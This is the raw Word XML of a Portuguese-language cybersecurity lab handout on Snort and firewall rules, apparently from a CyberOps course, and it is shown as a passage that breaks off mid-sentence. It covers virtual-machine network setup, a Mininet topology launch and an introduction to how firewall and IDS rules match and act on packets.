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D517001" w14:textId="56375CD3" w:rsidR="00D778DF" w:rsidRPr="009A1CF4" w:rsidRDefault="00866233" w:rsidP="00EA47B7">
      <w:pPr>
        <w:pStyle w:val="Ttulo"/>
      </w:pPr>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:b w:val="0"/>
            <w:color w:val="EE0000"/>
          </w:rPr>
          <w:alias w:val="Cargo"/>
          <w:tag w:val=""/>
          <w:id w:val="-487021785"/>
          <w:placeholder>
            <w:docPart w:val="D0A0047F9C244BA997070E2BCCA11C5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30E6">
            <w:t>Laboratório - Regras de Snort e Firewall</w:t>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="007330E6">
        <w:rPr>
          <w:rStyle w:val="LabTitleInstVersred"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EA47B7">
        <w:rPr>
          <w:rStyle w:val="LabTitleInstVersred"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3842D97E" w14:textId="77777777" w:rsidR="00D778DF" w:rsidRPr="00E70096" w:rsidRDefault="00D778DF" w:rsidP="00D452F4">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:t>Topologia</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779E7C61" w14:textId="77777777" w:rsidR="00D778DF" w:rsidRDefault="00CB6E06" w:rsidP="00D778DF">
      <w:pPr>
        <w:pStyle w:val="Visual"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="pt-BR"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="56E34B4C" wp14:editId="68CC927A">
            <wp:extent cx="6400800" cy="3997953"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="3"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AppData\Local\Microsoft\Windows\INetCache\Content.Word\mininet_extended_top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997953"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="16168BA1" w14:textId="77777777" w:rsidR="00D778DF" w:rsidRPr="00E70096" w:rsidRDefault="00D778DF" w:rsidP="00D452F4">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F752A9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006E1756" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25Bold"/>
      </w:pPr>
      <w:r>
        <w:t>Parte 1: Preparando o Ambiente Virtual</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202B1FEC" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25Bold"/>
      </w:pPr>
      <w:r>
        <w:t>Parte 2: Firewall e logs IDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31746465" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="0047026E" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25Bold"/>
      </w:pPr>
      <w:r>
        <w:t>Parte 3: Encerrar e Limpar o Processo Mininet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593C515A" w14:textId="77777777" w:rsidR="00D778DF" w:rsidRDefault="00D778DF" w:rsidP="00D452F4">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:t>Histórico/Cenário</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A09E1A7" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Em uma rede de produção segura, os alertas de rede são gerados por vários tipos de dispositivos, como dispositivos de segurança, firewalls, dispositivos IPS, roteadores, switches, servidores e muito mais. O problema é que nem todos os alertas são criados igualmente. Por exemplo, alertas gerados por um servidor e alertas gerados por um firewall serão diferentes e variam em conteúdo e formato. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6822BC73" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t>Neste laboratório, para se familiarizar com regras de firewall e assinaturas IDS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A4807D" w14:textId="77777777" w:rsidR="00D778DF" w:rsidRPr="00E70096" w:rsidRDefault="00D778DF" w:rsidP="00D452F4">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:t>Recursos necessários</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E26D5C2" w14:textId="6720754E" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel1"/>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Máquina Virtual CyberOps Workstation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E35568" w14:textId="6ABFBFFD" w:rsidR="00CB6E06" w:rsidRDefault="00BB7837" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel1"/>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Conexão com a Internet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26506022" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="005F6200" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Observação</w:t>
      </w:r>
      <w:r w:rsidRPr="000939C6">
        <w:t>: Neste laboratório, a VM CyberOps Workstation é um contêiner para armazenar o ambiente Mininet mostrado na Topologia. Se um erro de memória for recebido em uma tentativa de executar qualquer comando, saia da etapa, vá para as configurações da VM e aumente a memória. O padrão é 1 GB; tente 2 GB.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAC3050" w14:textId="3F703179" w:rsidR="00125806" w:rsidRDefault="00125806" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:t>Instruções</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68038932" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>Preparando o Ambiente Virtual</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB3223F" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00322BB3" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Inicie o </w:t>
      </w:r>
      <w:r w:rsidRPr="00322BB3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Oracle VirtualBox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">transmita o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>CyberOps Workstation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve"> para o modo Bridged, se necessário. Selecione </w:t>
      </w:r>
      <w:r w:rsidRPr="00322BB3">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Machine &gt; Settings &gt; Network</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>. Em</w:t>
      </w:r>
      <w:r w:rsidRPr="00322BB3">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attached To</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">, selecione </w:t>
      </w:r>
      <w:r w:rsidRPr="00322BB3">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">Bridged Adapter </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">(ou, se estiver usando WiFi com um proxy, talvez seja necessário um </w:t>
      </w:r>
      <w:r w:rsidRPr="005F6200">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>NAT adapter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">) e clique em </w:t>
      </w:r>
      <w:r w:rsidRPr="00322BB3">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>OK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7535B7FB" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A900CD" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">Inicie a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>VM CyberOps Workstation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">, abra um terminal e configure sua rede executando o script </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">configure_as_dhcp.sh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E00402" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A900CD" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">Como o script requer privilégios de superusuário, forneça a senha para o usuário </w:t>
      </w:r>
      <w:r w:rsidRPr="00A900CD">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>analyst</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350682E4" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[analyst @secOps ~] $</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> sudo./lab.support.files/scripts/configure_as_dhcp.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D82737" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A900CD" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>[sudo] password for analyst:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60654045" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>[analyst @secOps ~] $</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275F885C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use o comando </w:t>
      </w:r>
      <w:r w:rsidRPr="0052398A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ifconfig </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">para verificar se a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VM CyberOps Workstation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> agora tem um endereço IP em sua rede local. Você também pode testar a conectividade com um servidor público da Web fazendo ping em www.cisco.com. Use </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD38E2">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ctrl+C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para parar os pings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FEFD7A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[analyst @secOps ~] $</w:t>
      </w:r>
      <w:r w:rsidRPr="0052398A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> ping www.cisco.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4EF2CF" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>PING e2867.dsca.akamaiedge.net (23.204.15.199) 56(84) bytes of data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C5BF99" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>64 bytes from a23-204-15-199.deploy.static.akamaitechnologies.com (23.204.15.199): icmp_seq=1 ttl=54 time=28.4 ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1754269A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>64 bytes from a23-204-15-199.deploy.static.akamaitechnologies.com (23.204.15.199): icmp_seq=2 ttl=54 time=35.5 ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1259A981" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>^C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C87F40" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>--- e2867.dsca.akamaiedge.net ping statistics ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC6755E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>2 packets transmitted, 2 received, 0% packet loss, time 1002ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A917D0D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>rtt min/avg/máx/mdev = 28.446/32.020/35,595/3.578 ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7736C3" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00164274" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>Logs de firewall e IDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7CA4EA" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t>Firewalls e sistemas de detecção de intrusões (IDS) são frequentemente implantados para automatizar parcialmente a tarefa de monitoramento de tráfego. Ambos os firewalls e IDSs correspondem ao tráfego de entrada em relação às regras administrativas. Os firewalls costumam comparar o cabeçalho do pacote com um conjunto de regras, enquanto os IDSs costumam usar a carga do pacote para comparação do conjunto de regras. Como firewalls e IDSs aplicam as regras predefinidas a diferentes partes do pacote IP, IDS e regras de firewall têm estruturas diferentes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACF8930" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t>Embora haja uma diferença na estrutura de regras, algumas semelhanças entre os componentes das regras permanecem. Por exemplo, as regras de firewall e IDS contêm componentes correspondentes e componentes de ação. As ações são tomadas após uma correspondência ser encontrada.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CECAA9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel1"/>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Componente de correspondência</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - especifica os elementos de pacote de interesse, como: origem do pacote; destino do pacote; portas e protocolos da camada de transporte; e dados incluídos na carga útil do pacote.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16416F2B" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel1"/>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Componente de ação</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - especifica o que deve ser feito com esse pacote que corresponde a um componente, como: aceitar e encaminhar o pacote; descartar o pacote; ou enviar o pacote para um conjunto de regras secundário para inspeção adicional.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675279D1" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Um design de firewall comum é descartar pacotes por padrão enquanto especifica manualmente qual tráfego deve ser permitido. Conhecido como dropping-by-default, este design tem a vantagem de proteger a rede contra protocolos e ataques desconhecidos. Como parte desse design, é comum registrar os eventos de pacotes descartados, uma vez que estes são pacotes que não foram explicitamente permitidos e, portanto, infringem as políticas da organização. Tais eventos devem ser registados para análise futura.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621845C7" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:r>
        <w:t>Monitoramento de registro IDS em tempo real</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5839D0FD" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Na </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VM CyberOps Workstation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, execute o script para iniciar o </w:t>
      </w:r>
      <w:r w:rsidRPr="00EF237C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mininet</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1350C1" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[analyst @secOps ~] $</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> sudo./lab.support.files/scripts/cyberops_extended_topo_no_fw.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290DC399" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009C35C4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[sudo] password for analyst: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10158300" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009C35C4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Adding controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244F563E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Add switches</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AC47B1" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Add hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7647097E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Add links</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E442FD2" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Starting network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EB474F" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Configuring hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351B6822" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">R1 R4 H1 H2 H3 H4 H5 H6 H7 H8 H9 H10 H11 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7776B04C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Starting controllers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F564C8C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Starting switches</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC350EE" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Add routes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C048B88" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Post configure switches and hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5569CEC6" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00665964" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>*** Starting CLI:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572E7132" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>mininete&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB98141" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O prompt do </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD3467">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mininet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> deve ser exibido, indicando que o </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD3467">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mininet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> está pronto para comandos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A05848" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">No prompt do </w:t>
      </w:r>
      <w:r w:rsidRPr="00AF620C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mininet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, abra um shell no </w:t>
      </w:r>
